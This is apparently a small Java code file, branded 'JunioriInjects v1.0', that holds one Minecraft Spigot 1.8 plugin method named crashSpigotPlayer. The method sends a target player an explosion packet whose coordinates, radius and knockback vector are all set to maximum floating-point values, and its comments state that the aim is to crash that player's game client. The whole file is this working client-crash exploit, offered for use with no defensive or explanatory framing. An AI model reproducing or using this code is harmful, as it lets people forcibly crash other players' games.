//       __              _          _____        _           _       
//       \ \ _   _ _ __ (_) ___  _ _\_   \_ __  (_) ___  ___| |_ ___ 
//        \ \ | | | '_ \| |/ _ \| '__/ /\/ '_ \ | |/ _ \/ __| __/ __|
//     /\_/ / |_| | | | | | (_) | /\/ /_ | | | || |  __/ (__| |_\__ \
//     \___/ \__,_|_| |_|_|\___/|_\____/ |_| |_|/ |\___|\___|\__|___/ v1.0
//                                            |__/                   

    import java.util.Collections;
    
    import org.bukkit.entity.Player;
    import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
    
    import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
    import net.minecraft.server.v1_8_R3.Vec3D;
    
    @SuppressWarnings("unchecked")
	  void crashSpigotPlayer(Player player) {   //crash a player by packet
		  ((CraftPlayer)player).getHandle().playerConnection.sendPacket(   //sends following packet
			  	new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE,   //creates packet with max values
						  Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
	  }
